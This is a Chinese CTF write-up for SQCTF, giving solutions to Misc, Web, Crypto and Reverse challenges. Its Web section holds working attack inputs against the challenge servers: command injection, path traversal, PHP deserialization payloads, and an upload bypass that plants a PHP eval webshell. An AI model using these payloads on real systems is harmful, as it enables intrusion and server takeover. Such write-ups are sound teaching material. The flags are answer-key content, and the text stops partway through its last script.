---
title: SQCTF部分题目WP
index: true
icon: codicon:note
category:
  - CTF
  - Writeup
  - Misc
tag:
  - CTF
  - Writeup
  - SQCTF
---

打得是挺酣畅淋漓的，但是脑洞题有点多  
逆向ak了两轮，第三轮实在是k不动了

<!-- more -->

# Misc 解出9题

## 可否许我再少年

问卷题不再赘述

## ez\_music1

AU看一下频谱图就能看到flag了

SQCTF\{Rush\_B\}

## ez\_music2

给了两个音频，对齐后反相一下调整一下两个通道的音量，可以得到一个sstv音频，解码一下即可  
SQCTF\{Cute\_Tiger\}

## love.host

用binwalk跑了一下，文件尾部有一个zip压缩包

提取出来解压就得到了flag

sqctf\{Sun Ensheng is the most handsome.\}

## Welcome\_Sign\_in

签到题，不再赘述了

## 这是什么加密

这是base2048加密  
SQCTF\{97F586A3-302C-7163-3C13-32C32C58DBBE\}

## piet

piet加密，随便找个工具跑一下就能得到结果

SQCTF\{Hello world!\}

## FFT IFFT

逆FFT变换，写个脚本即可

```python
import os
import cv2
import struct
import numpy as np

def restore_frame(m_frame, p_frame, m_min, m_max):
    # 反归一化幅度谱
    m_normalized = m_frame.astype(np.float32) / 255.0
    log_m = m_normalized * (m_max - m_min) + m_min
    magnitude = np.exp(log_m)
    
    # 反归一化相位谱
    p_normalized = p_frame.astype(np.float32) / 255.0
    phase = p_normalized * (2 * np.pi) - np.pi
    
    # 重建复数FFT矩阵
    fft_complex = magnitude * (np.cos(phase) + 1j * np.sin(phase))
    
    # 逆FFT变换
    fft_ishift = np.fft.ifftshift(fft_complex)
    img_complex = np.fft.ifft2(fft_ishift)
    img = np.abs(img_complex).clip(0, 255).astype(np.uint8)
    
    return img

if __name__ == '__main__':
    # 创建目录
    os.makedirs('restored_frames', exist_ok=True)
    
    # 提取1.mkv和2.mkv的帧
    os.system('ffmpeg -i 1.mkv m/%03d.png')
    os.system('ffmpeg -i 2.mkv p/%03d.png')
    
    # 读取r文件中的min/max值
    min_max_list = []
    with open('r', 'rb') as r_file:
        data = r_file.read()
        for i in range(len(data) // 8):
            min_val, max_val = struct.unpack('!ff', data[i*8:(i+1)*8])
            min_max_list.append((min_val, max_val))
    
    # 处理每一帧
    frame_count = len(min_max_list)
    for i in range(1, frame_count + 1):
        filename = f"{i:03d}.png"
        m_img = cv2.imread(f'm/{filename}', cv2.IMREAD_GRAYSCALE)
        p_img = cv2.imread(f'p/{filename}', cv2.IMREAD_GRAYSCALE)
        
        # 恢复原始帧
        restored_img = restore_frame(m_img, p_img, *min_max_list[i-1])
        cv2.imwrite(f'restored_frames/{filename}', restored_img)
    
    # 合成视频
    os.system('ffmpeg -framerate 25 -i restored_frames/%03d.png -c:v libx264 -crf 18 -pix_fmt yuv420p restored_secret.mp4')
```

SQCTF\{HELLO\}

## 孩儿们等我破军

压缩包密码是爆破出来的，15375022是密码

解出来后给了6个铁剑，有不同的编号。解一下附图给的矩阵就有顺序了。  
$$A = \begin{pmatrix} 1 & 2 \\3 & 4 \end{pmatrix}B = \begin{pmatrix} 7 & 5 & 6 \\4 & 9 & 8 \end{pmatrix}AB = \begin{pmatrix} 15 & 23 & 22 \\37 & 51 & 50 \end{pmatrix}$$

然后按照这个顺序在6个铁剑的文件尾能找到reflect=\{\}这样格式的特征，把花括号的内容拼一块  
`WeL1c0Me`这就是222的密码  
解出来一个风暴巨剑，文件尾有一个密码`O5XXOILUMETXGIDDORTGK4R7EE======`

base32解一下解出来`wow!ta's ctfer?!`

作为快了快了的密码

解出来一个二维码，进行处理后扫描，得到`ZmxhZ3vkurLniLHnmoTlj6zllKTluIjvvJrmrKLov47mnaXliLBzcW51Y3Rm77yBfQ==`

解base64得到`flag{亲爱的召唤师：欢迎来到sqnuctf！}`

# Web 解出14题

## RceMe

payload:`?com=nl /*`

sqctf\{6de82d3312fb43f9a6f83e5d0b95888b\}

## ping

payload:`?ip=||cat /flag`

sqctf\{2adcc57a42e14593b4cb313294086f81\}

## Through

burp爆出来的

payload:`?file=..././..././..././..././..././..././..././..././..././..././flag`

sqctf\{c1de40febed845e5bae38429a416f1d5\}

## Input a Number

简单的进制转换  
payload:`?sqctf=0337522`

sqctf\{609c716a66f14179970636df2abe6478\}

## Ez\_calculate

用自动化做的，附脚本

```python
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.edge.options import Options

# 配置Edge选项
edge_options = Options()
edge_options.add_experimental_option("detach", True)  # 保持浏览器窗口打开
edge_options.use_chromium = True  # 使用Chromium内核的Edge

# 初始化Edge浏览器
driver = webdriver.Edge(options=edge_options)

try:
    # 访问本地HTML文件（修改为实际路径）
    driver.get("http://challenge.qsnctf.com:32271/")
    
    # 获取并处理算式
    challenge = driver.find_element(By.CLASS_NAME, 'challenge').text
    cleaned_expression = challenge.replace('×', '*').replace('÷', '/')  # 处理特殊符号
    
    # 安全计算（示例使用eval，实际生产环境建议使用更安全的方式）
    result = eval(cleaned_expression)
    print(f"计算结果：{cleaned_expression} = {result}")
    
    # 填写并提交表单
    driver.find_element(By.NAME, 'value').send_keys(str(int(result)))
    driver.find_element(By.TAG_NAME, 'button').click()
    
    # 保持窗口打开的额外保险措施
    input("按回车键结束程序（浏览器将保持打开）...")

except Exception as e:
    print(f"执行出错: {str(e)}")
    input("按回车键退出...")
finally:
    # 移除了 driver.quit() 以保持浏览器打开
    pass
```

`sqctf{a0aee6ee12b34a859f33a80d80068fc1}`

后来发现直接进/flag路由就能拿到了

## 哎呀大大大黑塔

脑洞题，SQNU变量赋值为大黑塔pv的bv号`BV1tXckehEd3`就能跳转到题目处了

反序列化漏洞  
payload:`data=O:6:"Secret":1:{s:3:"key";s:5:"SQCTF";}`

POST上去就能拿到flag

flag : sqctf\{5542b837ab8b4e0fb300f9b133eb1ed8\}

## Upload\_Level2

跟Upload\_Level1操作手法差不多，文件后缀改成php，加一步：Content-Type改成image/png就能把马挂上去  
sqctf\{389295fbb5344c43a6c44e30c3f3a5ab\}

## ezGame

这个题不清楚具体是怎么回事，玩了一会儿输了就拿到flag了

sqctf\{5a0b69dca2304502a91678dc88fb15fc\}

## baby rce

变量覆盖与static方法调用，以及sha1弱比较

get这块：`?param1[]=1&param2[]=1?computer_number=20`

post这块：`payload=TYctf::getKey`

sqctf\{5bc3bc7d288e453f84a1f7945ed40468\}

## 商师一日游

综合性很强的题目

1. 查看源代码获取第一处sqctf\{，然后跳转到/atc2cnzd.php
2. burp拦截，把Cookie参数中fish=weak改为fish=strong即可获取第二处d836，然后跳转到/atc3oklm.php
3. 在开发者工具中进入网络选项卡，刷新一次页面，在/atc3oklm.php的标头中找到第三处90754f，跳转到/atc4zztg.php
4. 转到/robots.txt，得到第四处a049dfb，跳转到/atc5uupl.php
5. 代码审计，构建payload：`?hhh=Php%0A114514`，得到第五处b1d8fb27，跳转到/atc6ertg.php
6. 打开开发者工具，用左上角的指针点一下按钮，把disabled删去，再点击按钮即可得到第六处7037c，跳转到/atc7wedf.php
7. 直接用蚁剑连接`http://challenge.qsnctf.com:31989/atc7wedf.php`，密码为memory，拿到了webshell，在本目录找到第七处1d\}

拼合起来，得到flag

sqctf\{d83690754fa049dfbb1d8fb277037c1d\}

## My Blog

简单的信息收集。

从github页找到了后台管理员账户密码

然后通过robots.txt找到后台登录页面

进入输入前面获得的用户名密码即可获得flag

**sqctf\{c26d9a997254476eac1e7dca3cc2a6fd\}**

## Upload\_Level1

上传一个内容为`<?php eval($_POST['cmd']);?>`的jpg格式文件，burp拦截，文件后缀改为.php

放行，用蚁剑连接`http://challenge.qsnctf.com:32656/upload/horse.php`，密码为cmd，在根目录即可得到flag

sqctf\{e5240cc047b94cd5a4f9bea3eea583af\}

## eeaassyy

用浏览器菜单栏打开开发者工具即可获取

sqctf\{295a62f0af1049728c7874d267554203\}

## 逃

我们需要构造一个序列化的字符串，表示一个 `test` 类的对象，并且该对象的 `$pswd` 属性值为 `'escaping'`。序列化后的字符串如下：

```
O:4:"test":2:{s:4:"user";s:4:"test";s:4:"pswd";s:8:"escaping";}
```

**利用方式:**

将上述 payload 作为 GET 参数 `payload` 的值发送给 PHP 脚本。

```
http://challenge.qsnctf.com:30705/?payload=O:4:"test":2:{s:4:"user";s:4:"test";s:4:"pswd";s:8:"escaping";}
```

即可获得

sqctf\{f4cf35ec8c7d4d80a843d601ef5032fd\}

# Crypto 解出14题

## base？

换表base64，用的是cyberchef中z64这个表

SQCTF\{b7b48685-03ef-4e24-b25b-212fac2ec2d3\}

## 密室逃脱的终极挑战

ida打开直接找到了flag

SQCTF\{F4BBAC33-8D80-A886-5238-EA35B38B353A\}

## 小白兔白又白

脑洞题  
base91->base64->base62->base16->rabbit（密钥233）  
SQCTF\{LOOK\_my\_eyes\_baby\_why?\}

## 玩的挺变态啊清茶哥

猪圈密码  
SQCTF\{jijibaotonghualizuoyingxiong\}

## 字母的轮舞与维吉尼亚的交响曲

没用常规方法做，直接爆破了  
先把原文扔给Vigenère Solver爆破得到

```
I thought of these words again from "One Hundred Years of Solitude." Lonelyness is a curse of creation to the group, and solitude is the only outlet for loneliness.Perhaps it was at this point that I finally understood Colonel Buendía and José Arcadio.Our hometown becomes a place we love not because it is our hometown, but because we believe it to be our hometown. Home is used as a place to rest a drifting soul, and that is why it smells of decay and death, like withered leaves and deserted yellow soil. To return home is to break the concept of "me" back into "us," to be integrated into such a huge whole that slowly becomes invisible, Macondo, the City of Mirrors.“On a winter night, the soup pot was boiling on the stove, but he missed the sweltering heat in the back hall of the bookstore. The hum of the sun's rays on the dusty almond trees, the faint sirens of the midday meal, as he had in Macondo yearned for the soup on the stove in winter, the call of the coffee-peddler, and the swift flight of the larks in spring. VTFWI{brx_duh_zlq!}"Rizhao," he said, turning to Macondo. The two types of nostalgia were like mirrors opposite, and he was stuck in between, confused, unable to maintain a sublime transcendence.”
```

对`VTFWI{brx_duh_zlq!}`做凯撒枚举，得到flag  
SQCTF\{you\_are\_win!\}

## 别阴阳我了行吗？

阴阳怪气解码

SQCTF\{xm！tql！xm！\}

## 你的天赋是什么

摩斯密码解一下即可

SQCTF\{YOU-HAVE-TALENT\}

## 简单RSA

模数n可以通过factordb得到p和q两个数

```python
e = 65537
n = 7349515423675898192891607474991784569723846586810596813062667159281369435049497248016288479718926482987176535358013000103964873016387433732111229186113030853959182765814488023742823409594668552670824635376457830121144679902605863066189568406517231831010468189513762519884223049871926129263923438273811831862385651970651114186155355541279883465278218024789539073180081039429284499039378226284356716583185727984517316172565250133829358312221440508031140028515954553016396884149904097959425582366305748700291610280675014390376786701270107136492645593662763444032174543205008326706371954830419775515459878227148997362533
c = 3514741378432598036735573845050830323348005144476193092687936757918568216312321624978086999079287619464038817665467748860146219342413630364856274551175367026504110956407511224659095481178589587424024682256076598582558926372354316897644421756280217349588811321954271963531507455604340199167652015645135632177429144241732132275792156772401511326430069756948298403519842679923368990952555264034164975975945747016304948179325381238465171723427043140473565038827474908821764094888942553863124323750256556241722284055414264534546088842593349401380142164927188943519698141315554347020239856047842258840826831077835604327616

# Factors from factordb
p = 85729314844316224669788680650977264735589729061816788627612566392188298017717541385878388569465166835406950222982743897376939980435155664145111997305895651382483557180799129871344729666249390412399389403988459762024929767702864073925613168913279047262718022068944038280618279450911055132404010863611867388261
q = 85729314844316224669788680650977264735589729061816788627612566392188298017717541385878388569465166835406950222982743897376939980435155664145111997305895651382483557180799129871344729666249390412399389403988459762024929767702864073925613168913279047262718022068944038280618279450911055132404010863614460682753

# Verify that p and q are correct
assert p * q == n

# Compute phi(n)
phi = (p - 1) * (q - 1)

# Compute the private key d
d = pow(e, -1, phi)

# Decrypt the ciphertext
m = pow(c, d, n)

# Convert the message to bytes
message_bytes = m.to_bytes((m.bit_length() + 7) // 8, byteorder='big')

print("Decrypted message:", message_bytes.decode('utf-8'))
```

Decrypted message: SQCTF\{be7e48547356cdf16649fd29e0ff9e1f\}

## 春风得意马蹄疾

嵌套的核心价值观编码，将每次解码出的内容再次解码，就能得到flag

SQCTF\{E2jacnicamcm\_cnanamw\_kwkma\}

## ezCRT

中国剩余定理

```python
from gmpy2 import iroot
from Crypto.Util.number import long_to_bytes

n1 = 64461804435635694137780580883118542458520881333933248063286193178334411181758377012632600557019239684067421606269023383862049857550780830156513420820443580638506617741673175086647389161551833417527588094693084581758440289107240400738205844622196685129086909714662542181360063597475940496590936680150076590681
n2 = 82768789263909988537493084725526319850211158112420157512492827240222158241002610490646583583091495111448413291338835784006756008201212610248425150436824240621547620572212344588627328430747049461146136035734611452915034170904765831638240799554640849909134152967494793539689224548564534973311777387005920878063
n3 = 62107516550209183407698382807475681623862830395922060833332922340752315402552281961072427749999457737344017533524380473311833617485959469046445929625955655230750858204360677947120339189429659414555499604814322940573452873813507553588603977672509236539848025701635308206374413195614345288662257135378383463093

c1 = 36267594227441244281312954686325715871875404435399039074741857061024358177876627893305437762333495044347666207430322392503053852558456027453124214782206724238951893678824112331246153437506819845173663625582632466682383580089960799423682343826068770924526488621412822617259665379521455218674231901913722061165
c2 = 58105410211168858609707092876511568173640581816063761351545759586783802705542032125833354590550711377984529089994947048147499585647292048511175211483648376727998630887222885452118374649632155848228993361372903492029928954631998537219237912475667973649377775950834299314740179575844464625807524391212456813023
c3 = 23948847023225161143620077929515892579240630411168735502944208192562325057681298085309091829312434095887230099608144726600918783450914411367305316475869605715020490101138282409809732960150785462082666279677485259918003470544763830384394786746843510460147027017747048708688901880287245378978587825576371865614

# 使用中国剩余定理求解 m^3 ≡ c mod n1*n2*n3
def crt(a, n):
    sum = 0
    prod = 1
    for ni in n:
        prod *= ni
    
    for ai, ni in zip(a, n):
        p = prod // ni
        sum += ai * pow(p, -1, ni) * p
    return sum % prod

m_cubed = crt([c1, c2, c3], [n1, n2, n3])

# 因为 m^3 < n1*n2*n3，可以直接开立方
m, is_perfect_cube = iroot(m_cubed, 3)
if is_perfect_cube:
    print("Found m:", long_to_bytes(m))
else:
    print("Failed to find perfect cube root")
```

SQCTF\{CRT\_Unl0cks\_RSA\_Eff1c13ncy\}

## ez\_SCA

AI写的

```python
import numpy as np

# 加载模板轨迹文件
template_trace_0 = np.load('template_trace_0.npy')
template_trace_1 = np.load('template_trace_1.npy')

# 加载能量轨迹文件
traces = np.load('energy_traces_with_flag.npy')

def bits_to_text(bits):
    chars = [bits[i:i+8] for i in range(0, len(bits), 8)]
    text = ''.join([chr(int(char, 2)) for char in chars])
    return text

# 假设每个能量轨迹对应 flag 的一个比特
recovered_bits = []
for trace in traces:
    # 计算当前能量轨迹与模板轨迹 0 的均方误差
    mse_0 = np.mean((trace - template_trace_0) ** 2)
    # 计算当前能量轨迹与模板轨迹 1 的均方误差
    mse_1 = np.mean((trace - template_trace_1) ** 2)

    # 如果与模板轨迹 0 的均方误差更小，则认为该比特为 0
    if mse_0 < mse_1:
        recovered_bits.append('0')
    else:
        recovered_bits.append('1')

# 将恢复的比特列表连接成字符串
recovered_bits_str = "".join(recovered_bits)

# 将恢复的比特字符串转换为文本
flag = bits_to_text(recovered_bits_str)

print("Recovered flag:", flag)
```

SQCTF\{easy\_funny\_and\_not\_hard\_sca\_hhh\_just\_kingdding\}

## 丢三落四的小I

仅dp泄露类型，工具直接一把梭  
SQCTF\{7b909221-c8ff-f391-0c86-d3a9ca8491d1\}

## Common Modulus

共模攻击，同样工具直接一把梭  
SQCTF\{06774dcf-b9d1-3c2d-8917-7d2d86b6721c\}

## 失落矿洞中的密码

ECC类型，给出脚本

```python
import time

# --- Elliptic Curve Parameters ---
a = 1234577
b = 3213242
p = 7654319

# --- Base Point G ---
Gx = 5234568
Gy = 2287747
G = (Gx, Gy)

# --- Public Key (Target) ---
Px = 2366653
Py = 1424308
PublicKey = (Px, Py)

# --- Modular Inverse Function ---
# Requires Python 3.8+ for pow(x, -1, p)
def inverse_mod(k, p):
    """Computes the modular inverse of k modulo p."""
    if k == 0:
        raise ZeroDivisionError('division by zero')
    # Fermat's Little Theorem (if p is prime): k^(p-2) % p
    # Using Python 3.8+ built-in:
    inv = pow(k, -1, p)
    if inv is None:
         raise ValueError(f"Modular inverse does not exist for {k} mod {p}")
    return inv

# --- Elliptic Curve Point Addition ---
# O represents the point at infinity
def point_add(P1, P2, a, p):
    """Adds two points P1 and P2 on the elliptic curve."""
    O = None # Point at infinity

    if P1 == O:
        return P2
    if P2 == O:
        return P1

    x1, y1 = P1
    x2, y2 = P2

    if x1 == x2 and (y1 + y2) % p == 0:
        return O # P1 + (-P1) = O

    if x1 == x2 and y1 == y2: # Point doubling case
        return point_double(P1, a, p)

    # Point addition P1 != P2
    try:
        # Calculate slope (lambda)
        numerator = (y2 - y1) % p
        denominator = (x2 - x1) % p
        inv_denominator = inverse_mod(denominator, p)
        m = (numerator * inv_denominator) % p

        # Calculate new coordinates
        x3 = (m**2 - x1 - x2) % p
        y3 = (m * (x1 - x3) - y1) % p

        return (x3, y3)
    except (ZeroDivisionError, ValueError):
        # Handle cases where inverse doesn't exist if denominator is 0 mod p
        # This shouldn't happen if P1 != +/- P2
        print(f"Error during point addition between {P1} and {P2}")
        return O # Or raise an error

# --- Elliptic Curve Point Doubling ---
def point_double(P, a, p):
    """Doubles a point P on the elliptic curve."""
    O = None # Point at infinity

    if P == O:
        return O

    x, y = P

    if y == 0: # Tangent is vertical
        return O

    try:
        # Calculate slope (lambda)
        numerator = (3 * x**2 + a) % p
        denominator = (2 * y) % p
        inv_denominator = inverse_mod(denominator, p)
        m = (numerator * inv_denominator) % p

        # Calculate new coordinates
        x3 = (m**2 - 2 * x) % p
        y3 = (m * (x - x3) - y) % p

        return (x3, y3)
    except (ZeroDivisionError, ValueError):
         # Handle cases where inverse doesn't exist (e.g., 2y = 0 mod p)
        print(f"Error during point doubling for {P}")
        return O # Or raise an error

# --- Scalar Multiplication (Basic Double-and-Add - Not used in this brute force) ---
# Included for completeness, but the brute force below uses iterative addition.
def scalar_multiply(k, P, a, p):
    """Computes k * P using the double-and-add algorithm."""
    O = None
    result = O
    addend = P

    while k > 0:
        if k & 1: # If the last bit is 1
            result = point_add(result, addend, a, p)
        # Double the addend for the next bit
        addend = point_double(addend, a, p)
        k >>= 1 # Move to the next bit

    return result

# --- Brute-Force Search for the Secret Key ---
print("Starting brute-force search for the secret key...")
print(f"Curve: y^2 = x^3 + {a}x + {b} (mod {p})")
print(f"Base Point G = {G}")
print(f"Public Key = {PublicKey}")
print("-" * 30)

start_time = time.time()
current_point = G       # Start with 1 * G
secretKey = 1
max_tries = p # Theoretical upper limit (order might be smaller)

while secretKey <= max_tries:
    if current_point == PublicKey:
        end_time = time.time()
        print(f"\nSuccess! Found secretKey (d): {secretKey}")
        print(f"Verification: {secretKey} * G = {current_point}")
        print(f"Time taken: {end_time - start_time:.2f} seconds")
        break

    # Calculate the next point: (current_key + 1) * G = (current_key * G) + G
    current_point = point_add(current_point, G, a, p)
    secretKey += 1

    # Optional: Print progress periodically (can slow down the process)
    if secretKey % 10000 == 0:
        elapsed_time = time.time() - start_time
        print(f"Checked up to key {secretKey}... Current point: {current_point} Time: {elapsed_time:.2f}s")

    # Check if we encountered the point at infinity unexpectedly or looped
    if current_point is None and secretKey < max_tries:
         print(f"\nEncountered point at infinity after {secretKey} additions. Public key not found with this method or error occurred.")
         break

else: # Loop finished without break
    end_time = time.time()
    print(f"\nSearch completed up to {max_tries} without finding the secret key.")
    print(f"Time taken: {end_time - start_time:.2f} seconds")

# --- If secretKey was found, proceed to decrypt ---
# Note: This part will only execute if the brute-force above succeeds.
if 'secretKey' in locals() and current_point == PublicKey:
    print("\nProceeding to decryption using the found secretKey...")

    # Ciphertext components
    C1 = (5081741, 6744615)
    C2 = (610619, 6218)

    # 1. Calculate S' = d * C1
    print(f"Calculating S' = {secretKey} * C1({C1})")
    # Need the full scalar_multiply function for this step
    # Re-implementing scalar_multiply here for clarity in the decryption phase
    def scalar_multiply_decrypt(k, P, a, p):
        O = None
        result = O
        addend = P
        count = 0
        while k > 0:
            if k & 1: # If the last bit is 1
                result = point_add(result, addend, a, p)
            # Double the addend for the next bit
            addend = point_double(addend, a, p)
            k >>= 1 # Move to the next bit
            count += 1
            # Optional progress for potentially long scalar multiplication
            # if count % 1000 == 0:
            #    print(f"Scalar multiplication progress: bit {count}")
            if addend == O and k > 0:
                 print("Warning: Addend became point at infinity during scalar multiplication.")
                 # This might indicate an issue or reaching the order of the point
                 break
        return result

    S_prime = scalar_multiply_decrypt(secretKey, C1, a, p)
    print(f"Calculated S' = {S_prime}")

    if S_prime is None:
        print("Error: Calculation of S' resulted in the point at infinity. Cannot decrypt.")
    else:
        # 2. Calculate -S'
        Sx_prime, Sy_prime = S_prime
        Sy_prime_inv = (-Sy_prime) % p
        S_prime_inv = (Sx_prime, Sy_prime_inv)
        print(f"Calculated -S' = {S_prime_inv}")

        # 3. Calculate M = C2 + (-S')
        print(f"Calculating M = C2({C2}) + (-S')({S_prime_inv})")
        M = point_add(C2, S_prime_inv, a, p)
        print(f"Decrypted Point M = {M}")

        if M is None:
            print("Error: Decryption resulted in the point at infinity.")
        else:
            # 4. Calculate x + y from M = (x, y)
            Mx, My = M
            result_sum = Mx + My
            print("-" * 30)
            print(f"Decrypted message point M = ({Mx}, {My})")
            print(f"The final result x + y = {Mx} + {My} = {result_sum}")
            print("-" * 30)

else:
     print("\nDecryption cannot proceed because the secret key was not found.")
```

SQCTF\{5720914\}

# Reverse 解出13题

## 天下谁人不识君

```python
flag = 'SQCTF{xxxxxxxxxxxxxx}'
s = 'wesyvbniazxchjko1973652048@$+-&*<>'
result = ''
for i in range(len(flag)):
    s1 = ord(flag[i])//17
    s2 = ord(flag[i])%17
    result += s[(s1+i)%34]+s[-(s2+i+1)%34]
print(result)
# result = 'v7b3boika$h4h5j0jhkh161h79393i5x010j0y8n$i'

s = 'wesyvbniazxchjko1973652048@$+-&*<>'
encoded_flag = 'v7b3boika$h4h5j0jhkh161h79393i5x010j0y8n$i'
flag_length = len(encoded_flag) // 2
reversed_flag = [''] * flag_length

for i in range(flag_length):
    char1_encoded = encoded_flag[2 * i]
    char2_encoded = encoded_flag[2 * i + 1]

    index1_encoded = s.find(char1_encoded)
    index2_encoded = s.find(char2_encoded)

    for char_code in range(32, 127):  # Iterate through printable ASCII characters
        s1_candidate = char_code // 17
        s2_candidate = char_code % 17

        if (s1_candidate + i) % 34 == index1_encoded and -(s2_candidate + i + 1) % 34 == index2_encoded:
            reversed_flag[i] = chr(char_code)
            break

print("Reversed flag:", "".join(reversed_flag))
```

SQCTF\{libai\_jianxian\}

## 遇事不决，可问春风

这段代码是一个Android应用的逆向分析结果，用于生成和验证Flag。以下是关键步骤分析：

1. **Flag结构**：
   `private String buildFlag(String password) {     return "SQCTF{i_am_a_" + password + "}"; }`
   Flag格式为`SQCTF{i_am_a_密码}`，其中密码需要解密得到。
2. **密码验证逻辑**：
   `private boolean checkPassword(String input) {     return input.equals(this.decryptPassword()); }`
   用户输入需要等于`decryptPassword()`的解密结果。
3. **密码解密过程**：
   `private String decryptPassword() {     String encrypted = getEncryptedPassword(); // 获取加密后的字符串     char[] chars = encrypted.toCharArray();     StringBuilder result = new StringBuilder();     for (int i = 0; i < chars.length; i++) {         char c = (char) (chars[i] ^ 0x42); // 每个字符与0x42异或         result.append(c);     }     return result.toString(); }`
4. **加密字符串生成**：
   `private String getEncryptedPassword() {     String[] parts = {"5","#",")","7","5","#",")","7"};     StringBuilder sb = new StringBuilder();     for (String part : parts) {         sb.append(part);     }     return sb.toString(); // 结果为"5#)75#)7" }`
5. **逐字符解密**：
  - `5` → ASCII 0x35 → 0x35 ^ 0x42 = 0x77 → `w`
  - `#` → ASCII 0x23 → 0x23 ^ 0x42 = 0x61 → `a`
  - `)` → ASCII 0x29 → 0x29 ^ 0x42 = 0x6B → `k`
  - `7` → ASCII 0x37 → 0x37 ^ 0x42 = 0x75 → `u`
  - 重复后得到完整密码：**`wakuwaku`**

**最终Flag**：

```
SQCTF{i_am_a_wakuwaku}
```

## 人生自古谁无死

本质上是chacha20加密

```python
# 生成v3密钥
g_obf2 = b'\xde\xad\xbe\xef'
v3 = bytes([g_obf2[i % 4] ^ (i + 17) for i in range(32)])

# 构造ChaCha20初始状态
constants = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574]
key = [int.from_bytes(v3[i*4:(i+1)*4], 'little') for i in range(8)]
nonce_part = [17 * j for j in range(12)]
nonce = [
    int.from_bytes(bytes(nonce_part[0:4]), 'little'),
    int.from_bytes(bytes(nonce_part[4:8]), 'little'),
    int.from_bytes(bytes(nonce_part[8:12]), 'little')
]
counter = 0
state = constants + key + [counter] + nonce

# ChaCha20轮函数
def rol32(v, n):
    return ((v << n) & 0xFFFFFFFF) | (v >> (32 - n))

def chacha20_quarter_round(a, b, c, d):
    a = (a + b) & 0xFFFFFFFF
    d = rol32(d ^ a, 16)
    c = (c + d) & 0xFFFFFFFF
    b = rol32(b ^ c, 12)
    a = (a + b) & 0xFFFFFFFF
    d = rol32(d ^ a, 8)
    c = (c + d) & 0xFFFFFFFF
    b = rol32(b ^ c, 7)
    return a, b, c, d

def chacha20_block(state):
    working_state = state.copy()
    for _ in range(10):
        # 四列处理
        working_state[0], working_state[4], working_state[8], working_state[12] = chacha20_quarter_round(working_state[0], working_state[4], working_state[8], working_state[12])
        working_state[1], working_state[5], working_state[9], working_state[13] = chacha20_quarter_round(working_state[1], working_state[5], working_state[9], working_state[13])
        working_state[2], working_state[6], working_state[10], working_state[14] = chacha20_quarter_round(working_state[2], working_state[6], working_state[10], working_state[14])
        working_state[3], working_state[7], working_state[11], working_state[15] = chacha20_quarter_round(working_state[3], working_state[7], working_state[11], working_state[15])
        # 四对角线处理
        working_state[0], working_state[5], working_state[10], working_state[15] = chacha20_quarter_round(working_state[0], working_state[5], working_state[10], working_state[15])
        working_state[1], working_state[6], working_state[11], working_state[12] = chacha20_quarter_round(working_state[1], working_state[6], working_state[11], working_state[12])
        working_state[2], working_state[7], working_state[8], working_state[13] = chacha20_quarter_round(working_state[2], working_state[7], working_state[8], working_state[13])
        working_state[3], working_state[4], working_state[9], working_state[14] = chacha20_quarter_round(working_state[3], working_state[4], working_state[9], working_state[14])
    # 相加初始state
    for i in range(16):
        working_state[i] = (working_state[i] + state[i]) & 0xFFFFFFFF
    # 转换为字节流
    return b''.join([s.to_bytes(4, 'little') for s in working_state])

# 生成密钥流
key_stream = chacha20_block(state.copy())

# 假设已知密文（需替换为实际值）
ciphertext = b'\xD0\xA1\x14\xB7\x58\xFA\x85\x91\x41\x53\x1B\x60\x38\xAB\xA5\x02\x29\xCB\xDD\x28\x4E\x67\xE6\x32\xD9'  # 替换为实际密文
plaintext = bytes([c ^ key_stream[i] for i, c in enumerate(ciphertext)])

print("Decrypted Flag:", plaintext.decode('latin-1'))
```

SQCTF\{real\_chacha20\_flag\}

## 春风也有春风愁

异或加密

```c
#include <stdio.h>
#include <stdint.h>

int main() {
    uint8_t v6[15];

    // 将64位无符号整数0xFBF715FA08FD0B0D赋值到数组的起始位置
    *(uint64_t *)v6 = 0xFBF715FA08FD0B0DULL;

    // 将64位无符号整数0xF0E011431130DFB赋值到数组从第7个字节开始的位置
    *(uint64_t *)&v6[7] = 0xF0E011431130DFBLL;

    // 打印数组的每个字节
    for (int i = 0; i < 15; i++) {
        printf("v6[%d] = %d\n", i, v6[i]);
    }

    return 0;
}
```

```python
v6 = [0]*15
v6[0] = 13
v6[1] = 11
v6[2] = 253
v6[3] = 8
v6[4] = 250
v6[5] = 21
v6[6] = 247
v6[7] = 251
v6[8] = 13
v6[9] = 19
v6[10] = 49
v6[11] = 20
v6[12] = 1
v6[13] = 14
v6[14] = 15

flag = []

for byte in v6:
    decrypted = (byte - 55) ^ 0xA5
    decrypted &= 0xFF  # 确保在 0~255 范围内
    try:
        flag.append(chr(decrypted))
    except ValueError:
        flag.append(f"\\x{decrypted:02x}")  # 无法打印的字符转为十六进制

print("Flag:", ''.join(flag))
```

sqctf\{easy\_xor\}

## 你若安好便是晴

```python
import struct

def sub_101(data, key):
    v0 = struct.unpack("<I", data[:4])[0]
    v1 = struct.unpack("<I", data[4:8])[0]
    sum_val = 0xC6EF3720
    delta = 0x61C88647
    for _ in range(32):
        term1 = (v0 + sum_val) & 0xFFFFFFFF
        term2 = ((v0 << 4) + key[2]) & 0xFFFFFFFF
        term3 = ((v0 >> 5) + key[3]) & 0xFFFFFFFF
        v1 = (v1 - (term1 ^ term2 ^ term3)) & 0xFFFFFFFF

        term4 = (v1 + sum_val) & 0xFFFFFFFF
        term5 = ((v1 << 4) + key[0]) & 0xFFFFFFFF
        term6 = ((v1 >> 5) + key[1]) & 0xFFFFFFFF
        v0 = (v0 - (term4 ^ term5 ^ term6)) & 0xFFFFFFFF

        sum_val = (sum_val + delta) & 0xFFFFFFFF
    return struct.pack("<II", v0, v1)

# The rest of your script (sub_102, sub_100, main) remains the same.

def sub_102(data):
    length = len(data)
    if length > 0:
        index = ord(data[length - 1])
        if index < length:
            return data[:length - index]
    return data

def sub_100(data, key):
    result = bytearray()
    for char in data:
        result.append(char ^ key)
    return bytes(result)

def main():
    str_hex = "7f1f17fd8e51aa660b8036914a4950e8fa8078a2ef33608650fb7a845226f2d1"
    str_bytes = bytes.fromhex(str_hex)
    v10 = len(str_bytes)

    v6 = [305419896, -2023406815 & 0xFFFFFFFF, -1412567144 & 0xFFFFFFFF, -1728127814 & 0xFFFFFFFF]

    processed_bytes = bytearray(str_bytes)
    for j in range(0, v10, 8):
        block = processed_bytes[j:j+8]
        if len(block) == 8:
            decrypted_block = sub_101(block, v6)
            processed_bytes[j:j+8] = decrypted_block

    truncated_bytes = sub_102(bytes(processed_bytes).decode('latin-1', errors='ignore'))
    v6_5 = 22
    final_bytes = sub_100(truncated_bytes.encode('latin-1'), v6_5)

    print(final_bytes.decode('latin-1'))

